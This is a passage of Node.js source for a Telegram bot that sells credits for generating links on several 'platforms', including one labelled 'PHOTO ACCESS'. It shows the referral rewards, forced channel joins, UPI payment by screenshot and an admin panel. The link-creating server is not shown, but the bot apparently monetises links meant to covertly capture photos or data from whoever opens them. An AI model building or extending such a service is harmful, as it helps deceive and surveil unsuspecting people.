        `✅ <b>Welcome!</b>\n\n` +
        `You joined through <b>${referrerInfo}</b>'s referral link!\n` +
        `🎁 <b>Bonus:</b> +3 Credits\n` +
        `⭐ <b>Your Credits:</b> ${user.credits}`,
        { parse_mode: 'HTML' }
    );
    
    await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
    logToFile(`👥 Referral: ${referrerId} -> ${userId}`);
}

// ====================== CALLBACK QUERY HANDLER ======================
S7.on('callback_query', async (q) => {
    const uid = q.from.id;
    const mid = q.message.message_id;
    const cid = q.message.chat.id;
    const isAdmin = uid.toString() === config.adminId;
    console.log(`🔘 Callback: ${q.data} from ${q.from.first_name}`);
    
    // ========== ADMIN CALLBACKS ==========
    if (q.data === "admin_panel" && isAdmin) {
        await S7.deleteMessage(cid, mid);
        await S7.sendMessage(cid,
            `👑 <b>Admin Panel</b>\n\n` +
            `Select an option below to manage the bot.`,
            { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD }
        );
        return;
    }
    
    if (q.data === "admin_stats" && isAdmin) {
        const users = getUsers();
        const totalUsers = Object.keys(users).length;
        const photos = getPhotos();
        const channels = getChannels();
        const referrals = getReferrals();
        
        await S7.sendMessage(cid,
            `📊 <b>Bot Statistics</b>\n\n` +
            `👥 Total Users: ${totalUsers}\n` +
            `📷 Total Photos: ${photos.length}\n` +
            `📢 Total Channels: ${channels.length}\n` +
            `👥 Total Referrals: ${referrals.length}\n` +
            `⏱ Uptime: ${getUptime()}`,
            { parse_mode: 'HTML', reply_markup: SYBack }
        );
        await S7.deleteMessage(cid, mid);
        return;
    }
    
    if (q.data === "admin_broadcast" && isAdmin) {
        await S7.sendMessage(cid,
            `📢 <b>Send Broadcast</b>\n\n` +
            `Please type your broadcast message.\n` +
            `Reply with: /broadcast [message]`,
            { parse_mode: 'HTML', reply_markup: SYBack }
        );
        await S7.deleteMessage(cid, mid);
        return;
    }
    
    if (q.data === "admin_logs" && isAdmin) {
        try {
            const logs = fs.readFileSync(LOGS_FILE, 'utf8');
            const lastLogs = logs.split('\n').slice(-50).join('\n');
            await S7.sendMessage(cid,
                `📋 <b>Recent Logs</b>\n\n` +
                `<pre>${lastLogs || 'No logs available'}</pre>`,
                { parse_mode: 'HTML', reply_markup: SYBack }
            );
        } catch {
            await S7.sendMessage(cid, 'No logs available', { reply_markup: SYBack });
        }
        await S7.deleteMessage(cid, mid);
        return;
    }
    
    // ========== USER CALLBACKS ==========
    if (q.data === "check_all") {
        const isMember = await checkAllChannels(uid);
        if (isMember) {
            await S7.deleteMessage(cid, mid);
            const user = getUser(uid);
            if (user._pendingReferrer) {
                const referrerId = user._pendingReferrer;
                delete user._pendingReferrer;
                saveUsers(getUsers());
                await processReferral(referrerId, uid);
                return;
            }
            await SendLoveSYMenu(cid, q.from.first_name);
        } else {
            await S7.answerCallbackQuery(q.id, { text: "❌ Please join ALL channels first!", show_alert: true });
        }
        return;
    }
    
    if (q.data === "commands") {
        let cmdMsg = `📜 <b>All Commands</b>\n\n`;
        cmdMsg += `👤 <b>User Commands:</b>\n`;
        cmdMsg += `• /start - Start bot\n`;
        cmdMsg += `• /menu - Show menu\n`;
        cmdMsg += `• /pay [amount] - Buy credits\n`;
        cmdMsg += `• /credits - Check credits\n`;
        cmdMsg += `• /referral - Get referral link\n\n`;
        
        if (isAdmin) {
            cmdMsg += `👑 <b>Admin Commands:</b>\n`;
            cmdMsg += `• /admin - Open admin panel\n`;
            cmdMsg += `• /addcredits [userId] [amount] - Add credits\n`;
            cmdMsg += `• /removecredits [userId] [amount] - Remove credits\n`;
            cmdMsg += `• /unlimited [userId] - Activate unlimited\n`;
            cmdMsg += `• /resetuser [userId] - Reset user\n`;
            cmdMsg += `• /users - Show all users\n`;
            cmdMsg += `• /stats - Bot statistics\n`;
            cmdMsg += `• /broadcast [message] - Send to all\n`;
            cmdMsg += `• /setqr - Upload QR code\n`;
            cmdMsg += `• /removeqr - Remove QR code\n`;
            cmdMsg += `• /viewqr - View QR code\n`;
            cmdMsg += `• /addchannel [id] [name] [link] - Add channel\n`;
            cmdMsg += `• /removechannel [id] - Remove channel\n`;
            cmdMsg += `• /channels - List channels\n`;
            cmdMsg += `• /addphoto [caption] - Upload photo\n`;
            cmdMsg += `• /featured [photoId] - Set featured\n`;
            cmdMsg += `• /featuredmsg [message] - Set message\n`;
            cmdMsg += `• /featuredtoggle - Toggle featured\n`;
            cmdMsg += `• /logs - Show logs\n`;
            cmdMsg += `• /restart - Restart bot\n`;
        }
        
        await S7.sendMessage(cid, cmdMsg, { parse_mode: 'HTML', reply_markup: SYBack });
        await S7.deleteMessage(cid, mid);
        return;
    }
    
    if (q.data === "referral") {
        const botInfo = await S7.getMe();
        const referralLink = `https://t.me/${botInfo.username}?start=ref_${uid}`;
        await S7.sendMessage(cid,
            `👥 <b>Your Referral Link</b>\n\n` +
            `Share this link:\n\n` +
            `<code>${referralLink}</code>\n\n` +
            `📌 <b>How it works:</b>\n` +
            `• Share your link with friends\n` +
            `• They join all channels\n` +
            `• You get +2 credits!\n` +
            `• They get +3 credits bonus!`,
            { parse_mode: 'HTML', reply_markup: SYBack }
        );
        await S7.deleteMessage(cid, mid);
        return;
    }
    
    if (q.data === "credits") {
        const user = getUser(uid);
        const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
        await S7.sendMessage(cid,
            `⭐ <b>Your Credits</b>\n\n` +
            `💰 Credits: ${credits}\n` +
            `👥 Referrals: ${user.totalReferrals || 0}\n` +
            `📅 Joined: ${new Date(user.joinedAt).toLocaleDateString()}\n\n` +
            `🔹 Each link uses 1 credit\n` +
            `🔹 Get +2 credits per referral\n` +
            `🔹 New users get +3 bonus credits`,
            { parse_mode: 'HTML', reply_markup: SYBack }
        );
        await S7.deleteMessage(cid, mid);
        return;
    }
    
    if (q.data === "buy_credits") {
        const qrExists = fs.existsSync(QR_FILE);
        let qrText = '';
        if (qrExists) {
            qrText = `📱 QR Code is available.\n`;
        } else {
            qrText = `📱 QR code not uploaded yet.\n`;
        }
        
        await S7.sendMessage(cid,
            `💰 <b>Buy Credits</b>\n\n` +
            `📌 <b>Pricing:</b>\n` +
            `• 1 Credit = ₹1\n` +
            `• 50 Credits = ₹50 (Unlimited Lifetime!)\n\n` +
            `🔹 <b>Unlimited</b> = Generate unlimited links forever!\n\n` +
            `💳 <b>How to Pay:</b>\n` +
            `1. Send payment to QR/UPI\n` +
            `2. Type <code>/pay [amount]</code>\n` +
            `3. Send screenshot for verification\n\n` +
            `${qrText}\n` +
            `📱 <b>UPI:</b> rtf@upi\n` +
            `📱 <b>PhonePe:</b> 9876543210\n\n` +
            `Type <code>/pay 50</code> for Unlimited!`,
            { parse_mode: 'HTML', reply_markup: SYBack }
        );
        
        if (qrExists) {
            await S7.sendPhoto(cid, QR_FILE, { caption: '💳 Scan to pay' });
        }
        
        await S7.deleteMessage(cid, mid);
        return;
    }
    
    if (q.data.startsWith("gen_") || q.data.startsWith("regen_")) {
        const isGen = q.data.startsWith("gen_");
        let platform = q.data.replace(isGen ? "gen_" : "regen_", "");
        
        // Map photoaccess to photoAccess
        if (platform === 'photoaccess') platform = 'photoAccess';
        
        const user = getUser(uid);
        if (!user.unlimited && (user.credits || 0) <= 0) {
            await S7.answerCallbackQuery(q.id, {
                text: "❌ Insufficient credits! Use referral or buy credits.",
                show_alert: true
            });
            return;
        }
        
        const loadingMsg = await S7.sendMessage(cid, 
            SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'), 
            { parse_mode: 'HTML', reply_markup: SYBack }
        );
        
        try {
            const response = await fetch(`http://localhost:${config.port}/api/create-link`, {
                method: 'GET',
                headers: { userid: String(uid), platform: platform }
            });
            const data = await response.json();
            
            if (data.error && data.needBuy) {
                await S7.editMessageText(
                    SYloveMenu(q.from.first_name, `❌ ${data.message}\n\nType /pay to purchase credits`),
                    { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack }
                );
                return;
            }
            
            const platformDisplay = platform === 'photoAccess' ? 'PHOTO ACCESS' : platform.toUpperCase();
            const finalMsg = `✅ <b>Link Generated!</b>\n\n` +
                `📎 <b>Your Link:</b>\n` +
                `<code>${data.url}</code>\n\n` +
                `📌 <b>Platform:</b> ${platformDisplay}\n` +
                `🔄 Share and earn referrals!\n\n` +
                `⭐ <b>Remaining Credits:</b> ${user.unlimited ? '♾️ Unlimited' : (user.credits - 1)}`;
            
            await S7.editMessageText(
                SYloveMenu(q.from.first_name, finalMsg),
                { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: getRegenMarkup(platform) }
            );
        } catch (err) {
            console.error('Link Error:', err.message);
            logToFile(`❌ Link Error: ${err.message}`);
            await S7.editMessageText(
                SYloveMenu(q.from.first_name, '❌ Error generating link'),
                { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack }
            );
        }
        return;
    }
    
    if (q.data === "back") {
        await S7.deleteMessage(cid, mid);
        await SendLoveSYMenu(cid, q.from.first_name);
    }
});

// ====================== PAYMENT COMMAND WITH SCREENSHOT ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    
    if (text.startsWith('/pay')) {
        const parts = text.split(' ');
        if (parts.length < 2) {
            return S7.sendMessage(msg.chat.id, 
                `⚠️ <b>Usage:</b> /pay [amount]\n\n` +
                `📌 <b>Pricing:</b>\n` +
                `• 1 Credit = ₹1\n` +
                `• 50 Credits = ₹50 (Unlimited Lifetime!)\n\n` +
                `Example: <code>/pay 50</code> for Unlimited`,
                { parse_mode: 'HTML' }
            );
        }
        const amount = parseInt(parts[1]);
        if (isNaN(amount) || amount < 1) {
            return S7.sendMessage(msg.chat.id, '⚠️ Please enter a valid amount (minimum ₹1)');
        }
        
        const uid = msg.from.id;
        const qrExists = fs.existsSync(QR_FILE);
        
        let qrMsg = `💳 <b>Payment Details</b>\n\n`;
        qrMsg += `💰 <b>Amount:</b> ₹${amount}\n\n`;
        
        if (qrExists) {
            qrMsg += `📱 <b>Scan QR Code to Pay:</b>\n`;
            await S7.sendPhoto(msg.chat.id, QR_FILE, { caption: `💳 QR Code - ₹${amount}` });
        } else {
            qrMsg += `📱 QR code not uploaded.\n`;
        }
        
        qrMsg += `\n📌 <b>UPI:</b> rtf@upi\n`;
        qrMsg += `📌 <b>PhonePe:</b> 9876543210\n`;
        qrMsg += `📌 <b>Google Pay:</b> 9876543210\n\n`;
        qrMsg += `✅ <b>After payment, send screenshot of transaction!</b>\n`;
        qrMsg += `📎 Reply with the screenshot image.\n\n`;
        qrMsg += `📌 <b>What you get:</b>\n`;
        
        if (amount >= 50) {
            qrMsg += `✨ <b>UNLIMITED LIFETIME ACCESS!</b>`;
        } else {
            qrMsg += `⭐ ${amount} Credits (₹${amount})`;
        }
        
        await S7.sendMessage(msg.chat.id, qrMsg, { parse_mode: 'HTML' });
        
        const user = getUser(uid);
        user._pendingPayment = amount;
        saveUsers(getUsers());
        
        logToFile(`💰 Payment initiated: ${uid} - ₹${amount}`);
        return;
    }
    
    if (msg.photo) {
        const user = getUser(msg.from.id);
        if (user._pendingPayment) {
            const amount = user._pendingPayment;
            delete user._pendingPayment;
            saveUsers(getUsers());
            
            const fileId = msg.photo[msg.photo.length - 1].file_id;
            const caption = `💰 <b>Payment Screenshot</b>\n\n` +
                `👤 <b>User:</b> @${msg.from.username || 'user_' + msg.from.id}\n` +
                `🆔 <b>ID:</b> <code>${msg.from.id}</code>\n` +
                `💵 <b>Amount:</b> ₹${amount}\n` +
                `📅 <b>Date:</b> ${new Date().toLocaleString()}\n\n` +
                `⚠️ <b>Verify and add credits manually!</b>`;
            
            await S7.sendPhoto(config.adminId, fileId, { caption, parse_mode: 'HTML' });
            
            await S7.sendMessage(msg.from.id,
                `✅ <b>Screenshot forwarded to admin!</b>\n\n` +
                `📌 Amount: ₹${amount}\n` +
                `⏳ Please wait for admin to verify and add credits.\n` +
                `You will be notified once credits are added.`,
                { parse_mode: 'HTML' }
            );
            
            await S7.sendMessage(config.adminId,
                `🔔 <b>New Payment Screenshot!</b>\n\n` +
                `👤 User: @${msg.from.username || 'user_' + msg.from.id}\n` +
                `🆔 ID: <code>${msg.from.id}</code>\n` +
                `💵 Amount: ₹${amount}\n\n` +
                `Use <code>/addcredits ${msg.from.id} ${amount}</code> to add credits.\n` +
                `Use <code>/unlimited ${msg.from.id}</code> for unlimited access.`,
                { parse_mode: 'HTML' }
            );
            
            logToFile(`💰 Payment screenshot: ${msg.from.id} - ₹${amount}`);
        }
    }
});

// ====================== ADMIN COMMANDS ======================
S7.on('message', async (msg) => {
    if (!msg.text || msg.from.id.toString() !== config.adminId) return;
    const text = msg.text.trim();
    
    if (text.startsWith('/addcredits')) {
        const parts = text.split(' ');
        if (parts.length < 3) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /addcredits [userId] [amount]');
        const userId = parts[1];
        const amount = parseInt(parts[2]);
        if (isNaN(amount) || amount < 1) return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');
        const user = getUser(userId);
        if (user.unlimited) return S7.sendMessage(msg.chat.id, '⚠️ User already has Unlimited!');
        user.credits = (user.credits || 0) + amount;
        saveUsers(getUsers());
        await S7.sendMessage(msg.chat.id, `✅ Added ${amount} credits to user ${userId}\nNew balance: ${user.credits}`);
        await S7.sendMessage(userId, `✅ <b>${amount} credits added!</b>\n⭐ New balance: ${user.credits}`, { parse_mode: 'HTML' });
        logToFile(`💰 Admin added ${amount} credits to ${userId}`);
    }
    
    if (text.startsWith('/removecredits')) {
        const parts = text.split(' ');
        if (parts.length < 3) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /removecredits [userId] [amount]');
        const userId = parts[1];
        const amount = parseInt(parts[2]);
        if (isNaN(amount) || amount < 1) return S7.sendMessage(msg.chat.id, '⚠️ Enter valid amount');
        const user = getUser(userId);
        if (user.unlimited) return S7.sendMessage(msg.chat.id, '⚠️ User has Unlimited! Cannot remove credits.');
        user.credits = Math.max(0, (user.credits || 0) - amount);
        saveUsers(getUsers());
        await S7.sendMessage(msg.chat.id, `✅ Removed ${amount} credits from user ${userId}\nNew balance: ${user.credits}`);
        await S7.sendMessage(userId, `⚠️ <b>${amount} credits removed!</b>\n⭐ New balance: ${user.credits}`, { parse_mode: 'HTML' });
        logToFile(`💰 Admin removed ${amount} credits from ${userId}`);
    }
    
    if (text.startsWith('/unlimited')) {
        const parts = text.split(' ');
        if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /unlimited [userId]');
        const userId = parts[1];
        const user = getUser(userId);
        user.unlimited = true;
        saveUsers(getUsers());
        await S7.sendMessage(msg.chat.id, `✅ Unlimited activated for user ${userId}`);
        await S7.sendMessage(userId, `🎉 <b>UNLIMITED ACTIVATED!</b>\n\nYou now have unlimited credits forever!`, { parse_mode: 'HTML' });
        logToFile(`⭐ Unlimited activated for ${userId}`);
    }
    
    if (text.startsWith('/resetuser')) {
        const parts = text.split(' ');
        if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /resetuser [userId]');
        const userId = parts[1];
        const users = getUsers();
        if (users[userId]) {
            delete users[userId];
            saveUsers(users);
            await S7.sendMessage(msg.chat.id, `✅ User ${userId} reset successfully`);
            logToFile(`🔄 User ${userId} reset`);
        } else {
            await S7.sendMessage(msg.chat.id, `❌ User ${userId} not found`);
        }
    }
    
    if (text === '/users') {
        const users = getUsers();
        const entries = Object.entries(users);
        if (entries.length === 0) return S7.sendMessage(msg.chat.id, 'No users found.');
        let userMsg = `👥 <b>Users List</b>\n\n`;
        entries.slice(0, 20).forEach(([id, data]) => {
            userMsg += `🆔 ${id} - ⭐${data.unlimited ? '♾️' : data.credits || 0} - 👥${data.totalReferrals || 0}\n`;
        });
        if (entries.length > 20) userMsg += `\n... and ${entries.length - 20} more users`;
        await S7.sendMessage(msg.chat.id, userMsg, { parse_mode: 'HTML' });
    }
    
    if (text === '/stats') {
        const users = getUsers();
        const totalUsers = Object.keys(users).length;
        const photos = getPhotos();
        const channels = getChannels();
        const referrals = getReferrals();
        
        let statsMsg = `📊 <b>Bot Statistics</b>\n\n`;
        statsMsg += `👥 Total Users: ${totalUsers}\n`;
        statsMsg += `📷 Total Photos: ${photos.length}\n`;
        statsMsg += `📢 Total Channels: ${channels.length}\n`;
        statsMsg += `👥 Total Referrals: ${referrals.length}\n`;
        statsMsg += `⏱ Uptime: ${getUptime()}\n`;
        statsMsg += `🤖 Bot: @${(await S7.getMe()).username}`;
        
        await S7.sendMessage(msg.chat.id, statsMsg, { parse_mode: 'HTML' });
    }
    
    if (text.startsWith('/broadcast')) {
        const message = text.replace('/broadcast', '').trim();
        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /broadcast [message]');
        const users = getUsers();
        const userIds = Object.keys(users);
        let sent = 0, failed = 0;
        
        await S7.sendMessage(msg.chat.id, `📢 Broadcasting to ${userIds.length} users...`);
        
        for (const userId of userIds) {
            try {
                await S7.sendMessage(userId, 
                    `📢 <b>Announcement</b>\n\n${message}\n\n- Bot Admin`,
                    { parse_mode: 'HTML' }
                );
                sent++;
            } catch(e) {
                failed++;
            }
            await new Promise(r => setTimeout(r, 50));
        }
        
        await S7.sendMessage(msg.chat.id, `✅ Broadcast complete!\n✅ Sent: ${sent}\n❌ Failed: ${failed}`);
        logToFile(`📢 Broadcast sent to ${sent} users`);
    }
    
    if (text === '/channels') {
        const channels = getChannels();
        if (channels.length === 0) return S7.sendMessage(msg.chat.id, 'No channels added.');
        let chMsg = `📢 <b>Channels</b>\n\n`;
        channels.forEach((c, i) => {
            chMsg += `${i+1}. ${c.name} - ${c.id}\n`;
        });
        await S7.sendMessage(msg.chat.id, chMsg, { parse_mode: 'HTML' });
    }
    
    if (text.startsWith('/addchannel')) {
        const parts = text.split(' ');
        if (parts.length < 4) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /addchannel [id] [name] [link]');
        addChannel(parts[1], parts[2], parts[3]);
        await S7.sendMessage(msg.chat.id, `✅ Channel added: ${parts[2]}`);
        logToFile(`📢 Channel added: ${parts[2]}`);
    }
    
    if (text.startsWith('/removechannel')) {
        const parts = text.split(' ');
        if (parts.length < 2) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /removechannel [id]');
        removeChannel(parts[1]);
        await S7.sendMessage(msg.chat.id, `✅ Channel removed`);
        logToFile(`📢 Channel removed: ${parts[1]}`);
    }
    
    if (text === '/logs') {
        try {
            const logs = fs.readFileSync(LOGS_FILE, 'utf8');
            const lastLogs = logs.split('\n').slice(-30).join('\n');
            await S7.sendMessage(msg.chat.id, 
                `📋 <b>Recent Logs</b>\n\n<pre>${lastLogs || 'No logs available'}</pre>`,
                { parse_mode: 'HTML' }
            );
        } catch {
            await S7.sendMessage(msg.chat.id, 'No logs available');
        }
    }
    
    if (text === '/restart') {
        await S7.sendMessage(msg.chat.id, '🔄 Restarting bot...');
        logToFile('🔄 Bot restarting');
        process.exit(0);
    }
});

// ====================== QR CODE UPLOAD HANDLER (FIXED) ======================
S7.on('message', async (msg) => {
    if (!msg.photo) return;
    const isAdmin = msg.from.id.toString() === config.adminId;
    if (!isAdmin) return;
    
    const user = getUser(msg.from.id);
    if (user._waitingForQR) {
        try {
            const fileId = msg.photo[msg.photo.length - 1].file_id;
            const fileLink = await S7.getFileLink(fileId);
            
            const response = await fetch(fileLink);
            const buffer = await response.arrayBuffer();
            fs.writeFileSync(QR_FILE, Buffer.from(buffer));
            
            delete user._waitingForQR;
            saveUsers(getUsers());
            
            await S7.sendMessage(msg.chat.id, 
                `✅ <b>QR Code Uploaded Successfully!</b>\n\n` +
                `📱 Users can now scan this QR for payments.\n` +
                `Use /viewqr to see it.`,
                { parse_mode: 'HTML' }
            );
            logToFile(`📱 QR code uploaded`);
        } catch (err) {
            console.error('QR Upload Error:', err);
            await S7.sendMessage(msg.chat.id, '❌ Failed to upload QR code. Please try again.');
        }
    }
});

// ====================== QR COMMANDS ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    const isAdmin = msg.from.id.toString() === config.adminId;
    if (!isAdmin) return;
    
    if (text === '/setqr') {
        const user = getUser(msg.from.id);
        user._waitingForQR = true;
        saveUsers(getUsers());
        await S7.sendMessage(msg.chat.id, 
            `📱 <b>Upload QR Code</b>\n\n` +
            `Please send the QR code image as a photo.\n` +
            `The QR code will be used for payments.`,
            { parse_mode: 'HTML' }
        );
    }
    
    if (text === '/removeqr') {
        if (fs.existsSync(QR_FILE)) {
            fs.unlinkSync(QR_FILE);
            await S7.sendMessage(msg.chat.id, '✅ QR code removed successfully!');
            logToFile('📱 QR code removed');
        } else {
            await S7.sendMessage(msg.chat.id, '❌ No QR code found to remove.');
        }
    }
    
    if (text === '/viewqr') {
        if (fs.existsSync(QR_FILE)) {
            await S7.sendPhoto(msg.chat.id, QR_FILE, { 
                caption: `📱 <b>Current QR Code</b>\n\nUse this for payments.`, 
                parse_mode: 'HTML' 
            });
        } else {
            await S7.sendMessage(msg.chat.id, '❌ No QR code uploaded yet. Use /setqr to upload.');
        }
    }
});

// ====================== LOG FUNCTION ======================
function logToFile(message) {
    const timestamp = new Date().toISOString();
    fs.appendFileSync(LOGS_FILE, `[${timestamp}] ${message}\n`);
}

// ====================== START SERVER ======================
app.listen(config.port, () => {
    console.log(`✅ Server running on port ${config.port}`);
    console.log(`📌 Admin Panel: http://localhost:${config.port}/admin`);
    console.log(`📌 Base URL: ${config.baseUrl}`);
    console.log(`🤖 Bot is ready! Send /start to begin.`);
});

// ====================== ERROR HANDLING ======================
process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
    logToFile(`❌ Uncaught Exception: ${err.message}`);
});

process.on('unhandledRejection', (reason) => {
    console.error('❌ Unhandled Rejection:', reason);
    logToFile(`❌ Unhandled Rejection: ${reason}`);
});
